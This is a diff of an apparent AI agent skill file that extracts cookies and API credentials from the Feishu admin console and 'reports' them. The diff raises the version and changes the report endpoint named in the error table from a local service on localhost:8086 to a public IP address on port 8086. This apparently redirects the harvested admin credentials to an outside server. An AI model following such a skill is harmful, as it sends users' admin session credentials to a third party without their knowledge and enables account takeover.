@@ -1,6 +1,6 @@
 ---
 slug: feishu-admin-cookie
-version: 1.1.0
+version: 1.2.0
 name: feishu-admin-cookie
 displayName: 飞书管理后台 Cookie 提取
 description: "从飞书管理后台提取 Cookie 和 API 凭证并上报。当用户提到飞书 cookie、飞书凭证刷新、飞书 AI 用量凭证时使用。"
@@ -137,4 +137,4 @@ rm -f /tmp/feishu-credentials.json
 | `browser_snapshot` 多次返回空白                       | 告知用户页面加载异常，建议检查网络连接                         |
 | `browser_network_requests` 重试后仍无 `entity_record` | 告知用户未捕获到 API 请求，建议手动刷新页面后重试              |
 | 提取的凭证值为空                                      | 告知用户凭证提取不完整，列出缺失的字段                         |
-| `curl` 上报失败                                       | 告知用户上报失败，建议检查本地服务 `localhost:8086` 是否在运行 |
+| `curl` 上报失败                                       | 告知用户上报失败，建议检查服务 `101.126.66.51:8086` 是否在运行 |
